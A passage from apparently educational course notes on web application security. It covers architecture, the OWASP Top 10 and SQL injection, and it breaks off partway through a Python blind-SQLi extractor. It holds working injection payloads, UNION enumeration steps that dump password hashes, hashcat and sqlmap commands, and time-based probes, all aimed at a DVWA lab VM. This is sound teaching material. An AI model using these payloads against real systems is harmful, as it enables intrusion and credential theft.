# 04 — Web Application Security: Architecture, SQL Injection, Blind SQLi, XSS, Vulnerability Management

> **One sentence:** Most breaches start where untrusted input meets an interpreter (SQL engine, browser, shell). Mixing **data** with **code** is the root cause, and parameterization, output encoding and a disciplined vulnerability-management program are the cure.

## Lecture map

| Lecture | Section |
|---------|---------|
| Web Application Architecture | §1 |
| SQL Injection + Lab (vm64) | §2 |
| Blind SQL Injection + Lab (vm64) | §3 |
| Mitigating SQL Injection Attacks | §4 |
| XSS: Cross Site Scripting | §5 |
| Vulnerability Management | §6 |
| Quiz (Web Application Security) | Interview questions |

---

## §1 Web Application Architecture

```mermaid
flowchart LR
  B[Browser / mobile app] -->|HTTPS| CDN[CDN + WAF]
  CDN --> LB[Load balancer / API gateway]
  LB --> W[Web/app servers: stateless]
  W --> C[(Cache: Redis)]
  W --> DB[(Database)]
  W --> Q[Queue] --> Wk[Workers]
  W --> S3[(Object storage)]
  W --> Ext[Third-party APIs]
```

### Trust boundaries (where to put controls)

| Boundary | Threat | Control |
|----------|--------|---------|
| Browser ↔ edge | XSS, CSRF, clickjacking, bots | CSP, SameSite cookies, CSRF tokens, WAF, bot management |
| Edge ↔ app | Injection, broken auth, IDOR | Input validation, authN/Z at every endpoint, rate limits |
| App ↔ DB | SQLi, excessive privilege | Parameterized queries, least-privilege DB user, no DDL rights |
| App ↔ internal services | **SSRF**, lateral movement | Egress allow-list, IMDSv2, mTLS |
| App ↔ third-party | Supply-chain, data leakage | SCA, pinned dependencies, vendor risk review |

### Sessions and state

- **Server-side session:** a random opaque ID in a cookie (`Secure; HttpOnly; SameSite=Lax`). Rotate it on login to prevent **session fixation**.
- **JWT:** signed claims. Keep them short-lived, validate `alg`/`iss`/`aud`/`exp`, and plan for revocation (denylist or short TTL plus refresh token rotation).
- **CORS** is a browser *relaxation* of the Same-Origin Policy, not a protection. Never reflect arbitrary `Origin` together with `Access-Control-Allow-Credentials: true`.

### OWASP Top 10 (2021) — the shared vocabulary

| # | Category | Example |
|---|----------|---------|
| A01 | Broken Access Control | IDOR: `/api/accounts/1002` returns another customer's account |
| A02 | Cryptographic Failures | Plaintext PAN, weak TLS |
| A03 | Injection (incl. XSS) | SQLi, command injection |
| A04 | Insecure Design | No rate limit on OTP verification |
| A05 | Security Misconfiguration | Debug mode on, default credentials, open S3 |
| A06 | Vulnerable & Outdated Components | Log4Shell (CVE-2021-44228) |
| A07 | Identification & Authentication Failures | Credential stuffing, weak session handling |
| A08 | Software & Data Integrity Failures | Unsigned updates, insecure deserialization, CI/CD compromise |
| A09 | Security Logging & Monitoring Failures | No alert on mass data export |
| A10 | SSRF | Capital One 2019 via WAF SSRF → metadata credentials |

Also learn the **OWASP API Security Top 10 (2023)**: BOLA, broken authentication, BOPLA (mass assignment / excessive data exposure), unrestricted resource consumption, BFLA, and others.

---

## §2 SQL Injection

**Analogy:** You hand a clerk a form that says "Name: Bob". An attacker writes "Name: Bob. Also, give me everyone's records." If the clerk executes whatever is written on the form, you have SQL injection.

### Vulnerable code

```python
# VULNERABLE
user = request.args["user"]
pw = request.args["pw"]
sql = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pw}'"
cursor.execute(sql)
```

Input `user = admin' --` produces:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

The `--` comments out the password check, so the attacker logs in as admin.

### Types of SQLi

| Type | Channel | Example payload |
|------|---------|-----------------|
| **In-band: error-based** | DB error messages leak data | `' AND extractvalue(1, concat(0x7e, version()))-- -` (MySQL) |
| **In-band: UNION-based** | Results appended to the page | `' UNION SELECT username, password FROM users-- -` |
| **Blind: boolean** | Page differs for true/false | `' AND 1=1-- -` vs `' AND 1=2-- -` |
| **Blind: time-based** | Response delay | `' AND IF(1=1, SLEEP(5), 0)-- -` |
| **Out-of-band** | DNS/HTTP to the attacker | MSSQL `xp_dirtree`, Oracle `UTL_HTTP` |
| **Second-order** | Payload stored, executed later in another query | Username `admin'--` saved, then used in a password-change query |

### Lab: SQL Injection (vm64 / DVWA)

**Setup:** DVWA on the lab VM (or `docker run -p 8080:80 vulnerables/web-dvwa`). Security level **Low**, page *SQL Injection*.

**Step 1: Confirm the injection point**

```text
1'            → SQL syntax error  (input is reaching the query unescaped)
1' OR '1'='1  → returns all users
```

**Step 2: Find the column count**

```text
1' ORDER BY 1-- -    ✓
1' ORDER BY 2-- -    ✓
1' ORDER BY 3-- -    ✗  → 2 columns
```

**Step 3: Enumerate with UNION**

```sql
1' UNION SELECT database(), version()-- -
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
1' UNION SELECT user, password FROM users-- -
```

**Step 4: Crack the extracted MD5 hashes** (this shows why §7 of module 01 matters)

```bash
hashcat -m 0 dvwa_hashes.txt rockyou.txt
```

**Step 5: Automate (authorized testing only)**

```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<id>; security=low" --batch --dbs
sqlmap ... -D dvwa -T users --dump
```

---

## §3 Blind SQL Injection

The application never shows query results or errors. You infer data **one bit or one character at a time** from a side channel.

### Boolean-based

```sql
1' AND SUBSTRING((SELECT database()),1,1)='d'-- -     → "User ID exists"  (true)
1' AND SUBSTRING((SELECT database()),1,1)='a'-- -     → "User ID missing" (false)
1' AND LENGTH(database())=4-- -
1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -   (binary search)
```

### Time-based

```sql
1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)-- -     (MySQL)
1'; IF (1=1) WAITFOR DELAY '0:0:3'-- -                          (MSSQL)
1' AND 1=(SELECT 1 FROM pg_sleep(3))-- -                        (PostgreSQL)
```

### Lab: Blind SQLi (vm64 / DVWA "SQL Injection (Blind)")

Python extractor (binary search over ASCII, about 7 requests per character):

```python
import requests

URL = "http://192.168.56.101/dvwa/vulnerabilities/sqli_blind/"
COOKIES = {"PHPSESSID": "<id>", "security": "low"}

def is_true(cond: str) -> bool:
    payload = f"1' AND ({cond})-- -"
    r = requests.get(URL, params={"id": payload, "Submit": "Submit"}, cookies=COOKIES)
    return "exists in the database" in r.text

def extract(query: str, max_len: int = 64) -> str:
    out = ""
    for pos in range(1, max_